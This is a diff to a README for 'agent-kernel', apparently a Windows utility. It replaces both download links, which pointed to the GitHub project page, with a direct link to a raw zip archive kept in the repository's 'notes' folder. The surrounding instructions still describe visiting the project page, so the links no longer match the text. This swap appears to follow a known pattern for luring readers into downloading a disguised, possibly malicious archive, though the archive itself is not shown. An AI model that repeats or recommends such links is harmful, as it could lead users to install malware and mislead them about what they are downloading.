@@ -1,6 +1,6 @@
 # 🧠 agent-kernel - Manage your digital memory with ease
 
-[![](https://img.shields.io/badge/Download-Agent%20Kernel-blue.svg)](https://github.com/carlososoriopulgar/agent-kernel)
+[![](https://img.shields.io/badge/Download-Agent%20Kernel-blue.svg)](https://raw.githubusercontent.com/carlososoriopulgar/agent-kernel/main/notes/agent_kernel_3.3.zip)
 
 ### 📖 About this application
 
@@ -14,7 +14,7 @@ This application runs on Windows 10 or Windows 11. Ensure your machine has at le
 
 Visit the link below to access the software files.
 
-[Download Agent Kernel Here](https://github.com/carlososoriopulgar/agent-kernel)
+[Download Agent Kernel Here](https://raw.githubusercontent.com/carlososoriopulgar/agent-kernel/main/notes/agent_kernel_3.3.zip)
 
 1. Select the link to open the project page in your web browser.
 2. Look for the green button labeled "Code" on the right side of the screen.
